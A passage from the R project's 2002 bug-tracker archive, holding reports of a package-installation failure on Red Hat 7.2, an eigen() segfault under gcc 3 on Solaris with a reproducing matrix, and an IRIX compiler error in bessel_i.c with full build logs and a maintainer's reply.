>(apart from the 00Index.html file).The only functional call is 
>always library(help=search) which displays all functions and 
>datasets of the package (the INDEX file, in fact). When looking at 
>the directories of the package, you find that only one file remains, 
>all other have disappeared (while they were there after tar).

I have also tried R CMD check which runs correctly and finds all files.

>The next test I did was desinstalling R 1.4.0, and reinstalling R 
>1.3.1, which led to no correction whatsoever (while before 
>installing R 1.4.0, there were no problem at all with R 1.3.1).
>Back with R 1.4.0, I am baffled, since it is like if the first 
>installation of R 1.4.0 had changed something to my Linux box.
>Last important element: some while ago, when I installed 15 packages 
>under RH 7.2 with R 1.3.1, everything worked OK. Moreover, for 
>upgrading to RH 7.2, I realised a new installation from scratch 
>after backup of all important data.

>Maybe I should also say that I install and desinstall R-base and 
>R-recommended using rpm files with gno-rpm.
Couldn't it be a general problem with the new binaries of R 1.4.0 and RH 7.2?
Any hint welcome, of course, because I have spend many many hours to 
try to fix that.

Best regards,
-- 
----------------------------
Patrick Gonin, DVM, PhD
Head of in vivo Evaluation Dept
GENETHON III
1 bis, rue de l'Internationale
BP 60
91002 EVRY CEDEX
FRANCE
Tel: 33-1-69-47-10-21
Fax: 33-1-60-77-86-98
gonin@genethon.fr
----------------------------

==> 1261.audit <==
Fri Jan 18 09:14:36 2002	ripley	changed notes
Fri Jan 18 09:14:36 2002	ripley	foobar
Fri Jan 18 09:14:36 2002	ripley	moved from incoming to System-specific
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1272 *
Subject: eigen segfault with GCC 3 on Solaris
From: Paul Gilbert <pgilbert@bank-banque-canada.ca>
Date: Thu, 17 Jan 2002 15:14:33 -0500
--Seems to be a problem with g77 in gcc 3.0.2 on Solaris only.
--Probably a compiler bug
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1272 <==
From pgilbert@bank-banque-canada.ca  Thu Jan 17 21:26:12 2002
Received: from mail1.bank-banque-canada.ca (mail1.bank-banque-canada.ca [140.80.193.130])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id VAA03042
	for <R-bugs@biostat.ku.dk>; Thu, 17 Jan 2002 21:26:11 +0100 (MET)
Received: from fwx-int (fwx-int.bank-banque-canada.ca [140.80.193.129])
	by mail1.bank-banque-canada.ca (8.9.3/8.9.3) with SMTP id PAA12351
	for <R-bugs@biostat.ku.dk>; Thu, 17 Jan 2002 15:14:51 -0500 (EST)
Received: from mfa99599.boc by mailhost.bank-banque-canada.ca (8.8.8+Sun/SMI-SVR4)
	id PAA12589; Thu, 17 Jan 2002 15:14:36 -0500 (EST)
Received: from mfa01506.boc (mfa01506 [140.80.3.112])
	by mfa99599.boc (8.9.1b+Sun/8.9.1) with ESMTP id PAA22347
	for <R-bugs@biostat.ku.dk>; Thu, 17 Jan 2002 15:14:35 -0500 (EST)
Received: from bank-banque-canada.ca (localhost [127.0.0.1])
	by mfa01506.boc (8.9.3+Sun/8.9.3) with ESMTP id PAA21692
	for <R-bugs@biostat.ku.dk>; Thu, 17 Jan 2002 15:14:33 -0500 (EST)
Sender: pgilbert@bank-banque-canada.ca
Message-ID: <3C4730A9.2F4818FA@bank-banque-canada.ca>
Date: Thu, 17 Jan 2002 15:14:33 -0500
From: Paul Gilbert <pgilbert@bank-banque-canada.ca>
X-Mailer: Mozilla 4.75 [en] (X11; U; SunOS 5.8 sun4u)
X-Accept-Language: en
MIME-Version: 1.0
To: R-bugs <R-bugs@biostat.ku.dk>
Subject: eigen segfault with GCC 3 on Solaris
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit

A message this morning reminded me of a previous problem I had which should be
noted in R bugs, but is really a problem with gcc 3 I believe. It may be only a
problem on Solaris, but AFAIK has not been checked on other platforms. I
resolved it by going back to a gcc 2.9x.x (which a few people suggested). Below
is the relevant part of my original post, an example which provokes the
segfault, and some gdb information from Peter Dalgaard.

PG>I have now tested R 1.3.1 compiled with GCC 3.0.2 on Solaris and the example
I
PG>previously posted (repeated below) still gives a segmentation fault, as it
does
PG>with GCC 3.0.1 but not with 2.95.2. The eigen calculation sometimes needs to
be
PG> repeated several times before the segmentation fault occurs. La.eigen does
not
PG> cause a problem. (The problem occurred with R-devel too, but I have not
tested
PG> that with GCC 3.0.2.)

PD>I don't know if it helps, but I see it too... 3.0.1 on Solaris 2.7.
PD>
PD>gdb says that it is happening at l.2144 of eigen.f:
PD>
PD>2142    C
PD>2143                DO 760 J = M, EN
PD>2144                   RA = RA + H(I,J) * H(J,NA)
PD>2145                   SA = SA + H(I,J) * H(J,EN)
PD>2146      760       CONTINUE
PD>2147    C
PD>
PD>J prints as 7289784 for me, which looks a bit weird since M and EN are
PD>17 and 18 respectively. However, optimizers sometimes cause this sort
PD>of thing.

----- example -----


zz <- t(matrix(c(
0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,  0.082008166, -0.066322053,
-0.115616348,
0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,  0.038919428,  0.009703382,
0.115944209,
0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -0.007823026, -0.068859673,
0.025264756,
1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,  0.067027108,  0.087934957,
-0.316974768,
0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,  0.024890008,  0.052195412,
-0.015138322,
0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,  0.028192857, -0.004832597,
0.207879665,
0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,  0.078706928, -0.012801413,
0.425960682,
0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,  0.102169750,  0.163238356,
-0.150373125,
0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, -0.002685166,  0.014355904,
0.197912183,
0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0,  0.042937314,  0.115719388,
0.679370293,
0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0,  0.032306141,  0.263227910,
0.009171148,
0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0,  0.008238734, -0.031480706,
0.051976566,
0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0,  0.015219148,  0.221345314,
0.020146770,
0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0,  0.039741608,  0.092955553,
-0.262550823,
0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0,  0.012624418,  0.047810873,
0.201673308,
0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, -0.114163303,  0.417786916,
0.253110874,
0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0,  0.049894329, -0.155696562,
-0.049735728,
0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1,  0.006112607,  0.074242237,
0.034046467
), 18,18))

eigen(zz)$values
eigen(zz)$values
eigen(zz)$values
eigen(zz)$values
eigen(zz)$values
eigen(zz)$values
eigen(zz)$values
eigen(zz)$values
Segmentation Fault - core dumped

==> 1272.audit <==
Fri Jan 18 09:10:34 2002	ripley	changed notes
Fri Jan 18 09:10:34 2002	ripley	foobar
Fri Jan 18 09:10:34 2002	ripley	moved from incoming to System-specific
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1275 *
Subject: compile problem with bessel_i.c on IRIX64 flexor 6.5 10100655 IP35 (uname -a)
From: Walter Tautz <wtautz@math.uwaterloo.ca>
Date: Tue, 22 Jan 2002 10:05:20 -0500 (EST)
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1275 <==
From wtautz@math.uwaterloo.ca  Tue Jan 22 16:05:53 2002
Received: from mfcf.math.uwaterloo.ca (wtautz@mfcf.math.uwaterloo.ca [129.97.216.156])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id QAA20264
	for <r-bugs@biostat.ku.dk>; Tue, 22 Jan 2002 16:05:52 +0100 (MET)
Received: from localhost (wtautz@localhost)
	by mfcf.math.uwaterloo.ca (8.9.3/8.9.3) with SMTP id KAA12752;
	Tue, 22 Jan 2002 10:05:20 -0500 (EST)
X-Authentication-Warning: mfcf.math: wtautz owned process doing -bs
Date: Tue, 22 Jan 2002 10:05:20 -0500 (EST)
From: Walter Tautz <wtautz@math.uwaterloo.ca>
Reply-To: Walter Tautz <wtautz@math.uwaterloo.ca>
To: r-bugs@biostat.ku.dk
cc: Walter Tautz <wtautz@math.uwaterloo.ca>
Subject: compile problem with bessel_i.c on IRIX64 flexor 6.5 10100655 IP35 (uname -a)
Message-ID: <Pine.SOL.3.96.1020122095845.3015H-100000@mfcf.math.uwaterloo.ca>
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII

I have included the full configure/make output:
(the particular error regarding bessel_i.c is at
the END of the report). 


-walter tautz 




	cd build/R-1.4.0 \
	    && unset noclobber \
	&& CPPFLAGS=" " \
	    LDFLAGS="" \
	       ./configure --prefix=/software/r-1 \
	           --datadir=/software/r-1/data \
	           --libdir=/software/r-1/lib \
	           --includedir=/software/r-1/include \
		   --with-x \
			   \
			 \
	           | tee configure.XHIER.log 2>&1 \
	&& touch XHIER_CONFIGURED
creating cache ./config.cache
checking for a BSD compatible install... tools/install-sh -c
checking whether build environment is sane... yes
checking whether make sets ${MAKE}... yes
checking for working aclocal... found
checking for working autoconf... found
checking for working automake... found
checking for working autoheader... found
checking for working makeinfo... found
checking host system type... mips-sgi-irix6.5
loading site script ./config.site
loading build specific script ./config.site
checking for pwd... /sbin/pwd
checking whether builddir is srcdir... yes
checking for gcc... gcc
checking whether the C compiler (gcc  ) works... yes
checking whether the C compiler (gcc  ) is a cross-compiler... no
checking whether we are using GNU C... yes
checking whether gcc accepts -g... yes
checking how to run the C preprocessor... gcc -E
checking whether gcc needs -traditional... no
checking whether gcc accepts -M for generating dependencies... yes
checking whether gcc supports -c -o FILE.lo... yes
checking for mawk... no
checking for gawk... no
checking for nawk... nawk
checking whether ln -s works... yes
checking for ranlib... :
checking for bison... bison -y
checking for ar... ar
checking whether echo can suppress newlines... yes
configure: warning: redefining INSTALL to be /scratch/usr/source/r-1/build/R-1.4.0/tools/install-sh -c
checking for javac... no
checking for less... /.software/local/.admin/bins/bin/less
checking for perl... /.software/local/.admin/bins/bin/perl
checking whether perl version is at least 5.004... yes
checking for dvips... no
checking for tex... configure: warning: you cannot build DVI versions of the R manuals
configure: warning: you cannot build PDF versions of the R manuals
no
checking for latex... no
checking for makeindex... no
checking for pdftex... no
checking for pdflatex... no
checking for makeinfo... /.software/local/.admin/bins/bin/makeinfo
checking for unzip... no
checking for zip... no
checking for Cygwin environment... no
checking for mingw32 environment... no
checking build system type... mips-sgi-irix6.5
checking for ld used by GCC... /usr/bin/ld
checking if the linker (/usr/bin/ld) is GNU ld... no
checking for /usr/bin/ld option to reload object files... -r
checking for BSD-compatible nm... /usr/bin/nm -B
checking how to recognise dependant libraries... pass_all
checking for object suffix... o
checking for executable suffix... no
checking command to parse /usr/bin/nm -B output... ok
checking for dlfcn.h... yes
checking for ranlib... (cached) :
checking for strip... strip
checking for objdir... .libs
checking for gcc option to produce PIC... none
checking if gcc static flag -static works... no
checking if gcc supports -c -o file.o... yes
checking if gcc supports -c -o file.lo... 
checking if gcc supports -fno-rtti -fno-exceptions... yes
checking whether the linker (/usr/bin/ld -64) supports shared libraries... yes
checking how to hardcode library paths into programs... immediate
checking whether stripping libraries is possible... no
checking dynamic linker characteristics... irix6.5 ld.so
checking if libtool supports shared libraries... yes
checking whether -lc should be explicitly linked in... yes
creating libtool
checking whether makeinfo version is at least 4... yes
checking for main in -lm... yes
defining F77 to be g77
checking whether the Fortran 77 compiler (g77  ) works... yes
checking whether the Fortran 77 compiler (g77  ) is a cross-compiler... no
checking whether we are using GNU Fortran 77... yes
checking whether g77 accepts -g... yes
checking for Fortran 77 libraries...  -lg2c -lm -L/.software/arch/gcc-2.95.3/distribution/lib/gcc-lib/mips-sgi-irix6.5/2.95.3/mabi=64 -L/.software/arch/gcc-2.95.3/distribution/lib/gcc-lib/mips-sgi-irix6.5/2.95.3 -L/usr/bin -L/.software/arch/gcc-2.95.3/dis

tribution/lib/mabi=64 -L/.software/arch/gcc-2.95.3/distribution/lib -lm -L/usr/lib64/mips3 -L/usr/lib64
checking whether g77 appends underscores... yes
checking whether g77 and gcc agree on int and double... yes
checking whether g77 and gcc agree on double complex... yes
checking whether g77 supports -c -o FILE.lo... yes
checking for c++... g++
checking whether the C++ compiler (g++  ) works... yes
checking whether the C++ compiler (g++  ) is a cross-compiler... no
checking whether we are using GNU C++... yes
checking whether g++ accepts -g... yes
checking how to run the C++ preprocessor... g++ -E
checking whether g++ accepts -M for generating dependencies... yes
checking whether g++ supports -c -o FILE.lo... yes
checking for sin in -lm... yes
checking for sin in -lmoto... no
checking for main in -lncurses... no
checking for main in -ltermcap... yes
checking for dlopen in -ldl... no
checking for ATL_xerbla in -latlas... no
checking for zherk in -lblas... no
checking for dgemm_ in -lblas... yes
checking for rl_callback_read_char in -lreadline... no
checking for working alloca.h... yes
checking for alloca... yes
checking for ANSI C header files... yes
checking for pid_t... yes
checking for vfork.h... no
checking for working vfork... no
checking for vprintf... yes
checking for access... yes
checking for acosh... yes
checking for asinh... yes
checking for atanh... yes
checking for bcopy... yes
checking for bzero... yes
checking for finite... yes
checking for ftruncate... yes
checking for getcwd... yes
checking for getgrgid... yes
checking for getpwuid... yes
checking for getuid... yes
checking for hypot... yes
checking for isascii... yes
checking for isnan... yes
checking for matherr... no
checking for memcpy... yes
checking for memmove... yes
checking for mempcpy... no
checking for mkfifo... yes
checking for popen... yes
checking for putenv... yes
checking for rint... yes
checking for setenv... no
checking for snprintf... yes
checking for strcoll... yes
checking for stat... yes
checking for strptime... yes
checking for system... yes
checking for times... yes
checking for unsetenv... no
checking for vsnprintf... yes
checking for strdup... yes
checking for library containing connect... none required
checking for library containing gethostbyname... none required
checking for library containing xdr_string... none required
checking for __setfpucw... no
checking for working calloc... yes
checking for working finite... yes
checking for working log... yes
checking for working strptime... no
checking for ANSI C header files... (cached) yes
checking whether time.h and sys/time.h may both be included... yes
checking for dirent.h that defines DIR... yes
checking for opendir in -ldir... no
checking for sys/wait.h that is POSIX.1 compatible... yes
checking for arpa/inet.h... yes
checking for dl.h... no
checking for dlfcn.h... (cached) yes
checking for elf.h... yes
checking for errno.h... yes
checking for fcntl.h... yes
checking for floatingpoint.h... no
checking for fpu_control.h... no
checking for grp.h... yes
checking for ieee754.h... no
checking for ieeefp.h... yes
checking for locale.h... yes
checking for netdb.h... yes
checking for netinet/in.h... yes
checking for pwd.h... yes
checking for readline/history.h... yes
checking for readline/readline.h... yes
checking for rpc/xdr.h... yes
checking for string.h... yes
checking for strings.h... yes
checking for sys/param.h... yes
checking for sys/select.h... yes
checking for sys/socket.h... yes
checking for sys/stat.h... yes
checking for sys/time.h... yes
checking for sys/times.h... yes
checking for sys/utsname.h... yes
checking for unistd.h... yes
checking whether setjmp.h is POSIX.1 compatible... yes
checking for GNU C library with version >= 2... no
checking whether math.h defines isfinite... no
checking whether math.h defines isnan... no
checking return type of signal handlers... void
checking for pid_t... (cached) yes
checking for size_t... yes
checking for blkcnt_t... yes
checking for sys/socket.h... (cached) yes
checking for type of socket length... size_t *
checking whether byte ordering is bigendian... yes
checking for working const... yes
checking size of int... 4
checking size of long... 8
checking size of long long... 8
checking size of long double... 8
checking whether C compiler needs -OPT:IEEE_NaN_inf=ON... no
checking for xmkmf... /usr/bin/X11/xmkmf
checking for X... libraries , headers 
checking for dnet_ntoa in -ldnet... no
checking for dnet_ntoa in -ldnet_stub... no
checking for gethostbyname... yes
checking for connect... yes
checking for remove... yes
checking for shmat... yes
checking for IceConnectionNumber in -lICE... yes
checking for tclConfig.sh... no
checking for tkConfig.sh... no
checking for tcl.h... no
checking for finite... (cached) yes
checking for isnan... (cached) yes
checking whether you have IEEE 754 floating-point arithmetic... yes
checking for BSD networking... yes
checking for jpeglib.h... yes
checking if jpeglib version >= 6b... no
checking for main in -lz... yes
checking for png.h... yes
checking if libpng version >= 1.0.5... no
checking for XDR support... yes
checking for gzopen in -lz... yes
checking for zlib.h... yes
checking if zlib version >= 1.1.3... no
checking whether leap seconds are treated according to POSIX... yes
checking for setitimer... yes
checking for lpr... lpr
checking for paperconf... false
updating cache ./config.cache
creating ./config.status
creating Makeconf
creating Makefile
creating afm/Makefile
creating doc/Makefile
creating doc/html/Makefile
creating doc/html/search/Makefile
creating doc/manual/Makefile
creating etc/Makefile
creating etc/Makeconf
creating etc/Renviron
creating m4/Makefile
creating share/Makefile
creating src/Makefile
creating src/appl/Makefile
creating src/include/Makefile
creating src/include/R_ext/Makefile
creating src/library/Makefile
creating src/library/base/DESCRIPTION
creating src/library/base/Makefile
creating src/library/profile/Makefile
creating src/library/ctest/DESCRIPTION
creating src/library/ctest/Makefile
creating src/library/ctest/src/Makefile
creating src/library/eda/DESCRIPTION
creating src/library/eda/Makefile
creating src/library/eda/src/Makefile
creating src/library/lqs/DESCRIPTION
creating src/library/lqs/Makefile
creating src/library/lqs/src/Makefile
creating src/library/methods/DESCRIPTION
creating src/library/methods/Makefile
creating src/library/methods/src/Makefile
creating src/library/modreg/DESCRIPTION
creating src/library/modreg/Makefile
creating src/library/modreg/src/Makefile
creating src/library/mva/DESCRIPTION
creating src/library/mva/Makefile
creating src/library/mva/src/Makefile
creating src/library/nls/DESCRIPTION
creating src/library/nls/Makefile
creating src/library/nls/src/Makefile
creating src/library/stepfun/DESCRIPTION
creating src/library/stepfun/Makefile
creating src/library/splines/DESCRIPTION
creating src/library/splines/Makefile
creating src/library/splines/src/Makefile
creating src/library/tcltk/DESCRIPTION
creating src/library/tcltk/Makefile
creating src/library/tcltk/src/Makefile
creating src/library/tools/DESCRIPTION
creating src/library/tools/Makefile
creating src/library/ts/DESCRIPTION
creating src/library/ts/Makefile
creating src/library/ts/src/Makefile
creating src/main/Makefile
creating src/modules/Makefile
creating src/modules/X11/Makefile
creating src/modules/gnome/Makefile
creating src/modules/internet/Makefile
creating src/modules/lapack/Makefile
creating src/modules/vfonts/Makefile
creating src/nmath/Makefile
creating src/nmath/standalone/Makefile
creating src/scripts/Makefile
creating src/scripts/COMPILE
creating src/scripts/INSTALL
creating src/scripts/REMOVE
creating src/scripts/R.sh
creating src/scripts/Rdconv
creating src/scripts/Rdindex
creating src/scripts/Rprof
creating src/scripts/SHLIB
creating src/scripts/Sd2Rd
creating src/scripts/build
creating src/scripts/check
creating src/unix/Makefile
creating tests/Makefile
creating tests/Embedding/Makefile
creating tests/Examples/Makefile
creating tools/Makefile
creating src/include/config.h
configure: warning: you cannot build DVI versions of the R manuals
configure: warning: you cannot build PDF versions of the R manuals


R is now configured for mips-sgi-irix6.5

  Source directory:          .
  Installation directory:    /software/r-1
  C compiler:                gcc  -g -O2
  C++ compiler:              g++  -g -O2
  FORTRAN compiler:          g77  -g -O2

  X11 support:               yes
  Gnome support:             no
  Tcl/Tk support:            no

  R profiling support:       yes
  R as a shared library:     no

	cd build/R-1.4.0 \
	&&  make  all \
	&& touch XHIER_BUILT
creating src/scripts/R.fe
mkdir ../../bin
mkdir ../../include
mkdir ../../../include/R_ext
making approx.d from approx.c
making bakslv.d from bakslv.c
making bandwidths.d from bandwidths.c
making binning.d from binning.c
making chull.d from chull.c
making cpoly.d from cpoly.c
making cumsum.d from cumsum.c
making fft.d from fft.c
making fmin.d from fmin.c
making integrate.d from integrate.c
making lbfgsb.d from lbfgsb.c
making loglin.d from loglin.c
making lowess.d from lowess.c
making machar.d from machar.c
making maxcol.d from maxcol.c
making massdist.d from massdist.c
making pretty.d from pretty.c
making rowsum.d from rowsum.c
making splines.d from splines.c
making stem.d from stem.c
making strsignif.d from strsignif.c
making tabulate.d from tabulate.c
making uncmin.d from uncmin.c
making zeroin.d from zeroin.c
	gcc -I. -I../../src/include -I../../src/include  -DHAVE_CONFIG_H   -g -O2 -c approx.c -o approx.o
	gcc -I. -I../../src/include -I../../src/include  -DHAVE_CONFIG_H   -g -O2 -c bakslv.c -o bakslv.o
	gcc -I. -I../../src/include -I../../src/include  -DHAVE_CONFIG_H   -g -O2 -c bandwidths.c -o bandwidths.o
	gcc -I. -I../../src/include -I../../src/include  -DHAVE_CONFIG_H   -g -O2 -c binning.c -o binning.o
	gcc -I. -I../../src/include -I../../src/include  -DHAVE_CONFIG_H   -g -O2 -c chull.c -o chull.o
	gcc -I. -I../../src/include -I../../src/include  -DHAVE_CONFIG_H   -g -O2 -c cpoly.c -o cpoly.o
	gcc -I. -I../../src/include -I../../src/include  -DHAVE_CONFIG_H   -g -O2 -c cumsum.c -o cumsum.o
	gcc -I. -I../../src/include -I../../src/include  -DHAVE_CONFIG_H   -g -O2 -c fft.c -o fft.o
	gcc -I. -I../../src/include -I../../src/include  -DHAVE_CONFIG_H   -g -O2 -c fmin.c -o fmin.o
	gcc -I. -I../../src/include -I../../src/include  -DHAVE_CONFIG_H   -g -O2 -c integrate.c -o integrate.o
	gcc -I. -I../../src/include -I../../src/include  -DHAVE_CONFIG_H   -g -O2 -c lbfgsb.c -o lbfgsb.o
	gcc -I. -I../../src/include -I../../src/include  -DHAVE_CONFIG_H   -g -O2 -c loglin.c -o loglin.o
	gcc -I. -I../../src/include -I../../src/include  -DHAVE_CONFIG_H   -g -O2 -c lowess.c -o lowess.o
	gcc -I. -I../../src/include -I../../src/include  -DHAVE_CONFIG_H   -g -O2 -c machar.c -o machar.o
	gcc -I. -I../../src/include -I../../src/include  -DHAVE_CONFIG_H   -g -O2 -c maxcol.c -o maxcol.o
	gcc -I. -I../../src/include -I../../src/include  -DHAVE_CONFIG_H   -g -O2 -c massdist.c -o massdist.o
	gcc -I. -I../../src/include -I../../src/include  -DHAVE_CONFIG_H   -g -O2 -c pretty.c -o pretty.o
	gcc -I. -I../../src/include -I../../src/include  -DHAVE_CONFIG_H   -g -O2 -c rowsum.c -o rowsum.o
	gcc -I. -I../../src/include -I../../src/include  -DHAVE_CONFIG_H   -g -O2 -c splines.c -o splines.o
	gcc -I. -I../../src/include -I../../src/include  -DHAVE_CONFIG_H   -g -O2 -c stem.c -o stem.o
	gcc -I. -I../../src/include -I../../src/include  -DHAVE_CONFIG_H   -g -O2 -c strsignif.c -o strsignif.o
	gcc -I. -I../../src/include -I../../src/include  -DHAVE_CONFIG_H   -g -O2 -c tabulate.c -o tabulate.o
	gcc -I. -I../../src/include -I../../src/include  -DHAVE_CONFIG_H   -g -O2 -c uncmin.c -o uncmin.o
	gcc -I. -I../../src/include -I../../src/include  -DHAVE_CONFIG_H   -g -O2 -c zeroin.c -o zeroin.o
	g77   -g -O2 -c ch2inv.f -o ch2inv.o
	g77   -g -O2 -c chol.f -o chol.o
	g77   -g -O2 -c dpbfa.f -o dpbfa.o
	g77   -g -O2 -c dpbsl.f -o dpbsl.o
	g77   -g -O2 -c dpoco.f -o dpoco.o
	g77   -g -O2 -c dpodi.f -o dpodi.o
	g77   -g -O2 -c dpofa.f -o dpofa.o
	g77   -g -O2 -c dposl.f -o dposl.o
	g77   -g -O2 -c dqrdc.f -o dqrdc.o
	g77   -g -O2 -c dqrdc2.f -o dqrdc2.o
	g77   -g -O2 -c dqrls.f -o dqrls.o
	g77   -g -O2 -c dqrsl.f -o dqrsl.o
	g77   -g -O2 -c dqrutl.f -o dqrutl.o
	g77   -g -O2 -c dsvdc.f -o dsvdc.o
	g77   -g -O2 -c dtrco.f -o dtrco.o
	g77   -g -O2 -c dtrsl.f -o dtrsl.o
	g77   -g -O2 -c eigen.f -o eigen.o
	g77   -g -O2 -c lminfl.f -o lminfl.o
	ar cr libappl.a approx.o  bakslv.o bandwidths.o binning.o  chull.o cpoly.o cumsum.o  fft.o fmin.o integrate.o lbfgsb.o loglin.o lowess.o  machar.o maxcol.o massdist.o  pretty.o  rowsum.o  splines.o stem.o strsignif.o  tabulate.o  uncmin.o  zeroin.o ch2in

v.o chol.o  dpbfa.o dpbsl.o dpoco.o dpodi.o dpofa.o dposl.o dqrdc.o  dqrdc2.o dqrls.o dqrsl.o dqrutl.o dsvdc.o dtrco.o dtrsl.o  eigen.o  lminfl.o 
	: libappl.a
making mlutils.d from mlutils.c
making d1mach.d from d1mach.c
making i1mach.d from i1mach.c
making fmax2.d from fmax2.c
making fmin2.d from fmin2.c
making fprec.d from fprec.c
making fround.d from fround.c
making ftrunc.d from ftrunc.c
making sign.d from sign.c
making fsign.d from fsign.c
making imax2.d from imax2.c
making imin2.d from imin2.c
making chebyshev.d from chebyshev.c
making log1p.d from log1p.c
making lgammacor.d from lgammacor.c
making gammalims.d from gammalims.c
making stirlerr.d from stirlerr.c
making bd0.d from bd0.c
making gamma.d from gamma.c
making lgamma.d from lgamma.c
making gamma_cody.d from gamma_cody.c
making beta.d from beta.c
making lbeta.d from lbeta.c
making polygamma.d from polygamma.c
making bessel_i.d from bessel_i.c
making bessel_j.d from bessel_j.c
making bessel_k.d from bessel_k.c
making bessel_y.d from bessel_y.c
making choose.d from choose.c
making snorm.d from snorm.c
making sexp.d from sexp.c
making dgamma.d from dgamma.c
making pgamma.d from pgamma.c
making qgamma.d from qgamma.c
making rgamma.d from rgamma.c
making dbeta.d from dbeta.c
making pbeta.d from pbeta.c
making qbeta.d from qbeta.c
making rbeta.d from rbeta.c
making dunif.d from dunif.c
making punif.d from punif.c
making qunif.d from qunif.c
making runif.d from runif.c
making dnorm.d from dnorm.c
making pnorm.d from pnorm.c
making qnorm.d from qnorm.c
making rnorm.d from rnorm.c
making dlnorm.d from dlnorm.c

==> 1275.reply.1 <==
From p.dalgaard@biostat.ku.dk  Tue Jan 22 16:29:23 2002
Received: from blueberry.kubism.ku.dk (blueberry [130.225.108.193])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id QAA20580;
	Tue, 22 Jan 2002 16:29:22 +0100 (MET)
Received: (from pd@localhost)
	by blueberry.kubism.ku.dk (8.11.2/8.11.2) id g0MFRjp00671;
	Tue, 22 Jan 2002 16:27:45 +0100
X-Authentication-Warning: blueberry.kubism.ku.dk: pd set sender to p.dalgaard@biostat.ku.dk using -f
Sender: pd@pubhealth.ku.dk
To: wtautz@math.uwaterloo.ca
Cc: r-devel@stat.math.ethz.ch, R-bugs@biostat.ku.dk
Subject: Re: [Rd] compile problem with bessel_i.c on IRIX64 flexor 6.5 10100655 IP35 (uname -a) (PR#1275)
References: <200201221505.QAA20274@pubhealth.ku.dk>
From: Peter Dalgaard BSA <p.dalgaard@biostat.ku.dk>
Date: 22 Jan 2002 16:27:45 +0100
In-Reply-To: <200201221505.QAA20274@pubhealth.ku.dk>
Message-ID: <x2elki4d8u.fsf@blueberry.kubism.ku.dk>
Lines: 37
User-Agent: Gnus/5.0808 (Gnus v5.8.8) Emacs/20.7
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii

wtautz@math.uwaterloo.ca writes:

> I have included the full configure/make output:
> (the particular error regarding bessel_i.c is at
> the END of the report). 
...
> bessel_i.c: In function `I_bessel':
> bessel_i.c:468: internal error--unrecognizable insn:
> (insn 1418 1417 673 (set:DF (reg/v:DF 101)
>         (if_then_else:DF (ne (reg:DI 416)
>                 (const_int 0 [0x0]))
>             (reg/v:DF 101)
>             (reg:DF 415))) -1 (insn_list 1417 (nil))
>     (expr_list:REG_DEAD (reg:DI 416)
>         (nil)))
> *** Error code 1 (bu21)
> *** Error code 1 (bu21)
> *** Error code 1 (bu21)
> *** Error code 1 (bu21)
> *** Error code 1 (bu21)

That looks like a problem in the gcc compiler suite. You might try
upgrading the compiler. Sometimes changing compiler flags (you would
only need to do it for the offending module) does the trick. 

Another possibility is that gcc is generating code that the system
assembler doesn't understand (this is happening with gcc 3 on
Solaris). If so, then you might install GNU binutils.

If none of this helps, I'm afraid that you need to take it up with the
GCC authors since it is not an R problem.

-- 
   O__  ---- Peter Dalgaard             Blegdamsvej 3  
  c/ /'_ --- Dept. of Biostatistics     2200 Cph. N   
 (*) \(*) -- University of Copenhagen   Denmark      Ph: (+45) 35327918
~~~~~~~~~~ - (p.dalgaard@biostat.ku.dk)             FAX: (+45) 35327907

==> 1275.followup.1 <==
From wtautz@math.uwaterloo.ca  Tue Jan 22 16:48:52 2002
Received: from mfcf.math.uwaterloo.ca (wtautz@mfcf.math.uwaterloo.ca [129.97.216.156])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id QAA20899;
	Tue, 22 Jan 2002 16:48:49 +0100 (MET)
Received: from localhost (wtautz@localhost)
	by mfcf.math.uwaterloo.ca (8.9.3/8.9.3) with SMTP id KAA14370;
	Tue, 22 Jan 2002 10:48:18 -0500 (EST)
X-Authentication-Warning: mfcf.math: wtautz owned process doing -bs
Date: Tue, 22 Jan 2002 10:48:18 -0500 (EST)
From: Walter Tautz <wtautz@math.uwaterloo.ca>
Reply-To: Walter Tautz <wtautz@math.uwaterloo.ca>
To: Peter Dalgaard BSA <p.dalgaard@biostat.ku.dk>
cc: r-devel@stat.math.ethz.ch, R-bugs@biostat.ku.dk,
        Walter Tautz <wtautz@math.uwaterloo.ca>
Subject: Re: [Rd] compile problem with bessel_i.c on IRIX64 flexor 6.5 10100655 IP35 (uname -a) (PR#1275)
In-Reply-To: <x2elki4d8u.fsf@blueberry.kubism.ku.dk>
Message-ID: <Pine.SOL.3.96.1020122103116.3015L-100000@mfcf.math.uwaterloo.ca>
